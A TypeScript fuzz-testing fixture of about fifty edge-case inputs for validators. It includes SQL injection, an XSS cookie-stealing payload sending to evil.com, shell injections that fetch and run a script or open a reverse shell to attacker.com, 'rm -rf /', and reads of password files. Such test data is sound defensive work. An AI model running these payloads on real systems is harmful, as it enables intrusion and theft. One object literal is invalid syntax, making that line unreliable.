/**
 * Fuzz Testing Data - 50+ Edge Cases for Automated Testing
 *
 * Categories:
 * 1. Null/Empty values
 * 2. SQL Injection
 * 3. XSS Payloads
 * 4. Path Traversal
 * 5. Shell Injection
 * 6. Unicode Edge Cases
 * 7. Numeric Boundaries
 * 8. String Edge Cases
 * 9. Array Edge Cases
 * 10. Object Edge Cases
 */

// ============================================================================
// Category 1: Null and Empty Values (5 cases)
// ============================================================================

export const NULL_EMPTY_CASES = [
  null,                    // 1. Null
  undefined,               // 2. Undefined
  '',                      // 3. Empty string
  ' ',                     // 4. Single space
  '\0',                    // 5. Null byte
] as const;

// ============================================================================
// Category 2: SQL Injection Payloads (10 cases)
// ============================================================================

export const SQL_INJECTION_CASES = [
  "'; DROP TABLE users; --",                              // 1. Classic DROP
  "1' OR '1'='1",                                         // 2. OR bypass
  "1; DELETE FROM sessions WHERE '1'='1",                 // 3. DELETE injection
  "' UNION SELECT password FROM users --",                // 4. UNION attack
  "admin'--",                                             // 5. Comment injection
  "1' AND SLEEP(5)#",                                     // 6. Time-based blind
  "'; EXEC xp_cmdshell('whoami'); --",                   // 7. Command exec
  "1 UNION ALL SELECT NULL,table_name FROM information_schema.tables--", // 8. Schema enum
  "' OR ''='",                                            // 9. Empty string bypass
  "1'; UPDATE users SET admin=1 WHERE username='admin'--", // 10. Privilege escalation
] as const;

// ============================================================================
// Category 3: XSS Payloads (10 cases)
// ============================================================================

export const XSS_CASES = [
  '<script>alert("XSS")</script>',                        // 1. Basic script
  '<img src=x onerror=alert(1)>',                         // 2. IMG error handler
  '"><script>document.location="http://evil.com/"+document.cookie</script>', // 3. Cookie steal
  "javascript:alert('XSS')",                              // 4. JavaScript URL
  '<svg onload=alert(1)>',                                // 5. SVG onload
  '<body onload=alert(1)>',                               // 6. Body onload
  '<iframe src="javascript:alert(1)">',                   // 7. Iframe javascript
  '${alert(1)}',                                          // 8. Template literal
  '{{constructor.constructor("alert(1)")()}}',            // 9. Angular template
  '<math><maction actiontype="toggle"><mtext>&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;</mtext></maction></math>', // 10. MathML
] as const;

// ============================================================================
// Category 4: Path Traversal (5 cases)
// ============================================================================

export const PATH_TRAVERSAL_CASES = [
  '../../../etc/passwd',                                  // 1. Unix passwd
  '..\\..\\..\\windows\\system32\\config\\sam',          // 2. Windows SAM
  '....//....//....//etc/passwd',                        // 3. Filter bypass
  '..%2f..%2f..%2fetc%2fpasswd',                        // 4. URL encoded
  '/etc/passwd%00.png',                                  // 5. Null byte extension
] as const;

// ============================================================================
// Category 5: Shell Injection (5 cases)
// ============================================================================

export const SHELL_INJECTION_CASES = [
  '; ls -la',                                            // 1. Semicolon
  '| cat /etc/passwd',                                   // 2. Pipe
  '`whoami`',                                            // 3. Backticks
  '$(whoami)',                                           // 4. Command substitution
  '&& curl http://evil.com/shell.sh | bash',            // 5. Download & execute
] as const;

// ============================================================================
// Category 6: Unicode Edge Cases (5 cases)
// ============================================================================

export const UNICODE_CASES = [
  '\u0000',                                              // 1. Null byte
  '\uFFFF',                                              // 2. Non-character
  '\u202E',                                              // 3. RTL override (spoofing)
  '\u200B',                                              // 4. Zero-width space
  '\uD800\uDFFF',                                        // 5. Surrogate pair
] as const;

// ============================================================================
// Category 7: Numeric Boundaries (10 cases)
// ============================================================================

export const NUMERIC_CASES = [
  -1,                                                    // 1. Negative one
  0,                                                     // 2. Zero
  -0,                                                    // 3. Negative zero
  Number.MAX_SAFE_INTEGER,                               // 4. Max safe int (9007199254740991)
  Number.MIN_SAFE_INTEGER,                               // 5. Min safe int (-9007199254740991)
  Number.MAX_VALUE,                                      // 6. Max value (~1.8e308)
  Number.MIN_VALUE,                                      // 7. Min positive (~5e-324)
  Infinity,                                              // 8. Positive infinity
  -Infinity,                                             // 9. Negative infinity
  NaN,                                                   // 10. Not a number
] as const;

// ============================================================================
// Full 50 Edge Cases for Fuzz Testing
// ============================================================================

export const FUZZ_50_EDGE_CASES = {
  // 1-5: Null/Empty
  case01_null: null,
  case02_undefined: undefined,
  case03_empty_string: '',
  case04_whitespace: '   ',
  case05_null_byte: '\0',

  // 6-15: SQL Injection
  case06_sql_drop: "'; DROP TABLE users; --",
  case07_sql_or: "1' OR '1'='1",
  case08_sql_union: "' UNION SELECT * FROM users --",
  case09_sql_comment: "admin'--",
  case10_sql_sleep: "1' AND SLEEP(5)#",
  case11_sql_exec: "'; EXEC xp_cmdshell('whoami'); --",
  case12_sql_truncate: "'; TRUNCATE TABLE messages; --",
  case13_sql_update: "'; UPDATE users SET role='admin' WHERE 1=1; --",
  case14_sql_insert: "'); INSERT INTO users VALUES('hacker','password'); --",
  case15_sql_delete: "'; DELETE FROM users; --",

  // 16-25: XSS Payloads
  case16_xss_script: '<script>alert(1)</script>',
  case17_xss_img: '<img src=x onerror=alert(1)>',
  case18_xss_svg: '<svg onload=alert(1)>',
  case19_xss_body: '<body onload=alert(1)>',
  case20_xss_iframe: '<iframe src="javascript:alert(1)">',
  case21_xss_href: '<a href="javascript:alert(1)">click</a>',
  case22_xss_style: '<div style="background:url(javascript:alert(1))">',
  case23_xss_event: '<div onclick="alert(1)">click</div>',
  case24_xss_template: '${alert(1)}',
  case25_xss_angular: '{{constructor.constructor("alert(1)")()}}',

  // 26-30: Path Traversal
  case26_path_unix: '../../../etc/passwd',
  case27_path_windows: '..\\..\\..\\windows\\system32\\config\\sam',
  case28_path_encoded: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  case29_path_null: '/etc/passwd%00.png',
  case30_path_double: '....//....//etc/passwd',

  // 31-35: Shell Injection
  case31_shell_semicolon: '; rm -rf /',
  case32_shell_pipe: '| cat /etc/passwd',
  case33_shell_backtick: '`whoami`',
  case34_shell_subst: '$(id)',
  case35_shell_and: '&& nc attacker.com 8080 -e /bin/sh',

  // 36-40: Unicode Edge Cases
  case36_unicode_null: '\u0000',
  case37_unicode_bom: '\uFEFF',
  case38_unicode_rtl: '\u202E',
  case39_unicode_zwsp: '\u200B',
  case40_unicode_surrogate: '\uD800',

  // 41-45: Numeric Edge Cases
  case41_num_negative: -1,
  case42_num_max_safe: Number.MAX_SAFE_INTEGER,
  case43_num_infinity: Infinity,
  case44_num_nan: NaN,
  case45_num_float: 0.1 + 0.2, // Floating point precision

  // 46-50: String Edge Cases
  case46_str_very_long: 'a'.repeat(100000),
  case47_str_emoji: '💀'.repeat(10000),
  case48_str_newlines: '\n'.repeat(10000),
  case49_str_mixed: 'test\r\nLine2\x00null\u202ErtlEnd',
  case50_str_all_ascii: String.fromCharCode(...Array(128).keys()),
} as const;

// ============================================================================
// Type-Specific Test Cases
// ============================================================================

export const EMAIL_EDGE_CASES = [
  'valid@example.com',                                   // Valid
  'a@b.co',                                              // Minimal valid
  '',                                                    // Empty
  'not-an-email',                                        // No @ sign
  'test@',                                               // Missing domain
  '@example.com',                                        // Missing local
  'test@.com',                                           // Missing domain name
  'a'.repeat(256) + '@example.com',                     // Too long
  'test\x00@example.com',                               // Null byte
  'test@ex ample.com',                                  // Space in domain
  'test+tag@example.com',                               // Valid with tag
  '"test"@example.com',                                 // Quoted local
  'test..double@example.com',                           // Double dot
  'test@-invalid.com',                                  // Hyphen start
  'test@example..com',                                  // Double dot in domain
] as const;

export const ADDRESS_EDGE_CASES = [
  '0x0000000000000000000000000000000000000000',         // Zero address
  '0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF',         // Max address
  '0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef',         // Valid
  '0x',                                                  // Too short
  '0x123',                                               // Too short
  '0x' + 'g'.repeat(40),                                // Invalid hex
  '0x' + '0'.repeat(39),                                // 39 chars
  '0x' + '0'.repeat(41),                                // 41 chars
  'not-an-address',                                      // No prefix
  '',                                                    // Empty
  ' 0x0000000000000000000000000000000000000000',        // Leading space
  '0x0000000000000000000000000000000000000000 ',        // Trailing space
  '0X0000000000000000000000000000000000000000',         // Uppercase X
  '0x' + '0'.repeat(38) + 'GG',                         // Invalid hex at end
  "0x'; DROP TABLE--",                                  // SQL injection
] as const;

export const UUID_EDGE_CASES = [
  '123e4567-e89b-12d3-a456-426614174000',              // Valid v1
  '550e8400-e29b-41d4-a716-446655440000',              // Valid v4
  '00000000-0000-0000-0000-000000000000',              // Nil UUID
  'ffffffff-ffff-ffff-ffff-ffffffffffff',              // Max UUID
  '',                                                   // Empty
  'not-a-uuid',                                         // Invalid
  '123',                                                // Too short
  '123e4567-e89b-12d3-a456',                           // Truncated
  '123e4567-e89b-12d3-a456-426614174000-extra',        // Extra
  '123e4567e89b12d3a456426614174000',                  // No dashes
  '123e4567-e89b-12d3-a456-42661417400g',              // Invalid char
  "'; DROP TABLE users; --",                           // SQL injection
  '123e4567-e89b-12d3-a456-426614174000\x00',          // Null byte
  ' 123e4567-e89b-12d3-a456-426614174000',             // Leading space
  '123e4567-e89b-12d3-a456-426614174000 ',             // Trailing space
] as const;

export const CHAIN_ID_EDGE_CASES = [
  1,        // Mainnet (valid)
  10,       // Optimism (valid)
  8453,     // Base (valid)
  42161,    // Arbitrum (valid)
  0,        // Invalid
  -1,       // Negative
  1.5,      // Float
  999999,   // Unknown chain
  NaN,      // NaN
  Infinity, // Infinity
] as const;

// ============================================================================
// Array and Object Edge Cases for Complex Inputs
// ============================================================================

export const ARRAY_EDGE_CASES = [
  [],                                                    // Empty array
  [null],                                                // Array with null
  [undefined],                                           // Array with undefined
  Array(100000).fill(0),                                // Very large array
  Array(10000).fill('x'.repeat(1000)),                  // Large array of large strings
  [[[[[[[[[[1]]]]]]]]]],                                // Deeply nested
  [1, 'string', true, null, {}, []],                    // Mixed types
  Array(100).fill({ id: 1, name: 'test' }),            // Array of objects
  ['\x00', '\x00', '\x00'],                             // Null bytes
  [NaN, Infinity, -Infinity, -0],                       // Special numbers
] as const;

export const OBJECT_EDGE_CASES = [
  {},                                                    // Empty object
  { __proto__: { admin: true } },                       // Prototype pollution
  { constructor: { prototype: { admin: true } } },      // Constructor pollution
  { toString: () => 'malicious' },                      // Overridden toString
  { valueOf: () => 'malicious' },                       // Overridden valueOf
  Object.create(null),                                  // No prototype
  { ['__proto__']: { isAdmin: true } },                // String key prototype
  { 'a'.repeat(10000): 'value' },                      // Very long key
  { a: { b: { c: { d: { e: 'deep' } } } } },          // Nested object
  { [Symbol.iterator]: function*() { yield 'x'; } },   // Iterator symbol
] as const;

// ============================================================================
// Fuzz Testing Runner
// ============================================================================

export interface FuzzResult {
  testCase: string;
  input: unknown;
  accepted: boolean;
  error?: string;
}

/**
 * Run fuzz tests against a validation function
 */
export function runFuzzTests(
  validator: (input: unknown) => boolean,
  testCases: Record<string, unknown> = FUZZ_50_EDGE_CASES
): FuzzResult[] {
  const results: FuzzResult[] = [];

  for (const [name, input] of Object.entries(testCases)) {
    try {
      const accepted = validator(input);
      results.push({ testCase: name, input, accepted });
    } catch (error) {
      results.push({
        testCase: name,
        input,
        accepted: false,
        error: error instanceof Error ? error.message : String(error),
      });
    }
  }

  return results;
}

/**
 * Print fuzz test summary
 */
export function printFuzzSummary(results: FuzzResult[]): void {
  const accepted = results.filter(r => r.accepted).length;
  const rejected = results.filter(r => !r.accepted).length;
  const errors = results.filter(r => r.error).length;

  console.log('\n=== Fuzz Test Summary ===');
  console.log(`Total: ${results.length}`);
  console.log(`Accepted: ${accepted}`);
  console.log(`Rejected: ${rejected}`);
  console.log(`Errors: ${errors}`);

  if (errors > 0) {
    console.log('\nErrors:');
    for (const r of results.filter(r => r.error)) {
      console.log(`  ${r.testCase}: ${r.error}`);
    }
  }
}
